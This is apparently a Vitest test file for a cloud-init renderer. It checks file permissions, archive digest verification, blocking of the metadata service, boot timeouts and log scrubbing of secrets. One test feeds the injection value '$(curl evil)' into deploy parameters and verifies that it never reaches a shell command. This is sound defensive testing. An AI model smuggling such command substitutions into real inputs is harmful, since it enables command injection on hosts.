import { describe, expect, it } from 'vitest';
import { deployHealthGateSeconds } from '../tasks/rollout-runtime';
import { bootPlanIn, cloudConfigFile } from '../tests/helpers/pulumi-mock';
import { type CloudInitParams, composeWaitTimeoutSeconds, renderCloudInit } from './cloud-init';

const link = (object: string) => `https://cella-boot-diag.s3.fr-par.scw.cloud/${object}?X-Amz-Expires=900&X-Amz-Signature=${'f'.repeat(64)}`;

function params(overrides: Partial<CloudInitParams> = {}): CloudInitParams {
  return {
    slug: 'cella',
    service: 'backend',
    profile: 'backend',
    startServices: ['backend'],
    releaseSha: 'abc123def',
    envFileContent: 'APP_MODE=production\nBACKEND_TAG=abc123def\nBACKEND_URL=https://api.example.test',
    composeContent: 'services:\n  backend: {}',
    bootImage: {
      image: 'rg.fr-par.scw.cloud/ns/infra-boot:abc123def',
      url: link('releases/abc123def/images/infra-boot.tar'),
      sha256: 'b'.repeat(64),
    },
    links: {
      env: link('env/backend-abc123def.env'),
      bootAccount: link('boot-diag/backend-20261103T120000Z-boot.log'),
      archives: [{ name: 'backend', image: 'rg.fr-par.scw.cloud/ns/backend:abc123def', url: link('releases/x/backend.tar'), sha256: 'a'.repeat(64) }],
    },
    ...overrides,
  };
}

const launcherOf = (out: string, slug = 'cella') => cloudConfigFile(out, `/etc/${slug}/run-boot.sh`) ?? '';

describe('renderCloudInit', () => {
  it('writes the plan, the launcher and the units before it runs the first-boot script, each private file closed to other users', () => {
    const out = renderCloudInit(params());
    expect(out.startsWith('#cloud-config\nwrite_files:\n')).toBe(true);
    expect(out.trimEnd().endsWith('runcmd:\n  - /etc/cella/first-boot.sh')).toBe(true);
    for (const [path, mode] of [
      ['/etc/cella/boot-plan.json', '0600'],
      ['/etc/cella/boot.env', '0600'],
      ['/etc/cella/run-boot.sh', '0700'],
      ['/etc/cella/first-boot.sh', '0700'],
    ]) {
      expect(out).toContain(`  - path: ${path}\n    permissions: '${mode}'\n`);
    }
    expect(cloudConfigFile(out, '/etc/systemd/system/infra-boot.service')).toContain('EnvironmentFile=/etc/cella/boot.env');
    expect(bootPlanIn(out, '/etc/cella/boot-plan.json').plan.bootDiagnostics.logFile).toBe('/var/log/infra-boot.log');
  });

  it('keeps the serial console markers the boot-account diagnosis reads, namespaced under the app slug', () => {
    const out = renderCloudInit(params({ slug: 'acme' }));
    const firstBoot = cloudConfigFile(out, '/etc/acme/first-boot.sh') ?? '';
    expect(firstBoot).toContain('exec > >(tee -a /var/log/infra-boot.log 2>/dev/null > /dev/console) 2>&1');
    expect(firstBoot).toContain('say() { echo "::acme:: $*" ; }');
    expect(firstBoot).toContain('say "BOOT FAILED (exit $rc)"');
    expect(firstBoot).toContain('say "boot start"');
    // Enabled so it re-runs on every reboot, which runs the kept env file and the loaded images.
    expect(firstBoot).toContain('systemctl enable infra-boot.service');
    expect(launcherOf(out, 'acme')).toContain('boot --plan /etc/acme/boot-plan.json');
    expect(out).not.toContain('/etc/cella');
  });

  it('must not run a boot runner whose archive differs from its digest: the launcher checks it before Docker loads it', () => {
    const lines = launcherOf(renderCloudInit(params())).split('\n');
    const check = lines.findIndex((line) => line.includes('sha256sum -c --status'));
    expect(check).toBeGreaterThan(-1);
    expect(lines[check]).toContain('"$BOOT_ARCHIVE_SHA256  /opt/app/images/boot-runner.tar"');
    // A stalled transfer must not hold the boot: each attempt ends and is retried.
    expect(lines.find((line) => line.includes('"$BOOT_ARCHIVE_URL"'))).toMatch(/curl -fsS --max-time \d+ --retry/);
    expect(lines.slice(check + 1, check + 5)).toContain('    exit 1');
    expect(check).toBeLessThan(lines.findIndex((line) => line.includes('docker load')));
    expect(lines.findIndex((line) => line.includes('docker load'))).toBeLessThan(lines.findIndex((line) => line.startsWith('exec docker run')));
  });

  it('keeps every per-deploy value out of a shell command position: the EnvironmentFile and the JSON plan carry them', () => {
    const evil = '$(curl evil)';
    const out = renderCloudInit(params({ releaseSha: evil, bootImage: { ...params().bootImage, image: `x:${evil}` } }));
    expect(launcherOf(out)).toContain('"$BOOT_IMAGE"');
    expect(launcherOf(out)).not.toContain(evil);
    expect(cloudConfigFile(out, '/etc/cella/first-boot.sh')).not.toContain(evil);
    expect(cloudConfigFile(out, '/etc/cella/boot.env')).toContain(`BOOT_IMAGE=x:${evil}`);
  });

  it("must not let an app container read the machine's user data: the launcher drops the metadata service for the bridge at every boot", () => {
    const lines = launcherOf(renderCloudInit(params())).split('\n');
    const block = lines.findIndex((line) => line.startsWith('iptables -I DOCKER-USER -d 169.254.42.42 -j DROP'));
    // Only DOCKER-USER runs ahead of Docker's own ACCEPT rules: there is no other chain to fall back to, so a failure ends the boot.
    expect(lines[block]).toBe('iptables -I DOCKER-USER -d 169.254.42.42 -j DROP || exit 1');
    expect(block).toBeLessThan(lines.findIndex((line) => line.startsWith('exec docker run')));
    expect(launcherOf(renderCloudInit(params()))).toContain('docker run --rm --network host');
  });

  it('bounds the release companion and the start inside the deploy health gate', () => {
    const { plan } = bootPlanIn(renderCloudInit(params()), '/etc/cella/boot-plan.json');
    expect(plan.timeouts.composeWaitSeconds).toBe(composeWaitTimeoutSeconds);
    // The env file and the archives load in about the first two minutes of the gate; the failure and its upload must land before it gives up.
    expect(composeWaitTimeoutSeconds + 120).toBeLessThanOrEqual(deployHealthGateSeconds);
  });

  it('emits a log-scrub sed pattern that matches secret-bearing lines and links', () => {
    const firstBoot = cloudConfigFile(renderCloudInit(params()), '/etc/cella/first-boot.sh') ?? '';
    const sedLines = firstBoot.split('\n').filter((line) => line.includes('sed') && line.includes('cloud-init'));
    expect(sedLines).toHaveLength(2);
    for (const line of sedLines) {
      const pattern = line.match(/'\/(.+)\/Id'/)?.[1];
      expect(pattern, `no sed address in: ${line}`).toBeTruthy();
      expect(line).toContain('-E');
      const re = new RegExp(pattern as string, 'i');
      expect(re.test('export SCW_SECRET_KEY=abc')).toBe(true);
      expect(re.test('DATABASE_URL=postgres://…')).toBe(true);
      expect(re.test(link('env/backend.env'))).toBe(true);
      expect(re.test('harmless log line')).toBe(false);
    }
  });
});
